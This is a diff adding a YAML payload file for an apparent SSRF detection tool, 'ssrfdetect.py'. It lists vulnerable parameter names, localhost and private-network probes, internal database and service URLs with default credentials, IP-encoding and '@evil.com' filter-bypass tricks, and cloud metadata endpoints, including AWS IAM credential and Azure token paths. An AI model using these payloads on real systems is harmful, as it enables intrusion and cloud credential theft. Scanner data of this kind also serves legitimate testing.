@@ -1,0 +1,87 @@
+# SSRF Detection Payloads
+# Usado por ssrfdetect.py
+# Última atualização: 2026-07-16
+
+url_params:
+  - url
+  - link
+  - href
+  - src
+  - dest
+  - destination
+  - redirect
+  - redirect_url
+  - redirect_uri
+  - next
+  - return
+  - return_to
+  - site
+  - page
+  - path
+  - file
+  - load
+  - fetch
+  - get
+  - pull
+  - proxy
+  - target
+  - uri
+  - document
+  - image
+
+detect_payloads:
+  - ["localhost_80", "http://127.0.0.1:80", "response"]
+  - ["localhost_443", "http://127.0.0.1:443", "response"]
+  - ["localhost_8080", "http://127.0.0.1:8080", "response"]
+  - ["localhost_3000", "http://127.0.0.1:3000", "response"]
+  - ["localhost_8443", "http://127.0.0.1:8443", "response"]
+  - ["private_10", "http://10.0.0.1", "response"]
+  - ["private_172", "http://172.16.0.1", "response"]
+  - ["private_192", "http://192.168.1.1", "response"]
+  - ["loopback", "http://[::1]", "response"]
+  - ["metadata_aws", "http://169.254.169.254/latest/meta-data/", "ami-id"]
+  - ["metadata_gcp", "http://metadata.google.internal/computeMetadata/v1/", "metadata"]
+  - ["metadata_azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"]
+  - ["zero_ip", "http://0.0.0.0", "response"]
+  - ["decimal_ip", "http://2130706433", "response"]
+  - ["hex_ip", "http://0x7f000001", "response"]
+
+internal_payloads:
+  - ["internal_mysql", "mysql://root:password@127.0.0.1:3306/", ["mysql", "access_denied"]]
+  - ["internal_redis", "redis://127.0.0.1:6379/", ["redis", "connection"]]
+  - ["internal_mongodb", "mongodb://127.0.0.1:27017/", ["mongodb", "connection"]]
+  - ["internal_postgres", "postgresql://user:pass@127.0.0.1:5432/", ["postgresql", "connection"]]
+  - ["internal_elasticsearch", "http://127.0.0.1:9200/", ["cluster_name", "elastic"]]
+  - ["internal_kafka", "http://127.0.0.1:9092/", ["kafka", "connection"]]
+  - ["internal_etcd", "http://127.0.0.1:2379/", ["etcd", "key"]]
+  - ["internal_docker", "http://127.0.0.1:2375/containers/json", ["Id", "Image"]]
+  - ["internal_jenkins", "http://127.0.0.1:8080/api/json", ["jobs", "primaryView"]]
+  - ["internal_gitlab", "http://127.0.0.1:80/api/v4/projects", ["gitlab", "project"]]
+
+bypass_payloads:
+  - ["decimal_localhost", "http://2130706433", "response"]
+  - ["decimal_127", "http://2130706433:80", "response"]
+  - ["octal_localhost", "http://0177.0.0.1", "response"]
+  - ["hex_localhost", "http://0x7f000001", "response"]
+  - ["ipv6_localhost", "http://[::1]", "response"]
+  - ["ipv6_0", "http://[0:0:0:0:0:0:0:1]", "response"]
+  - ["url_encoded_dot", "http://127%2e0%2e0%2e1", "response"]
+  - ["double_encoded_dot", "http://127%252e0%252e0%252e1", "response"]
+  - ["no_scheme", "127.0.0.1", "response"]
+  - ["scheme_bypass", "//127.0.0.1", "response"]
+  - ["at_bypass", "http://127.0.0.1@evil.com", "response"]
+  - ["backslash", "http://127.0.0.1\\@evil.com", "response"]
+  - ["tab_injection", "http://127.0.0.1\t@evil.com", "response"]
+  - ["newline_injection", "http://127.0.0.1%0a@evil.com", "response"]
+  - ["port_redirect", "http://127.0.0.1:80@evil.com", "response"]
+
+cloud_payloads:
+  - ["aws_metadata_token", "http://169.254.169.254/latest/api/token", ["ami-id", "instance-id"]]
+  - ["aws_metadata_latest", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]]
+  - ["aws_metadata_user_data", "http://169.254.169.254/latest/user-data/", ["user-data"]]
+  - ["aws_metadata_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["credentials"]]
+  - ["gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/?recursive=true", ["metadata"]]
+  - ["gcp_project", "http://metadata.google.internal/computeMetadata/v1/project/project-id", ["project"]]
+  - ["azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute"]]
+  - ["azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", ["access_token"]]
+  - ["digital_ocean", "http://169.254.169.254/metadata/v1/", ["digitalocean"]]
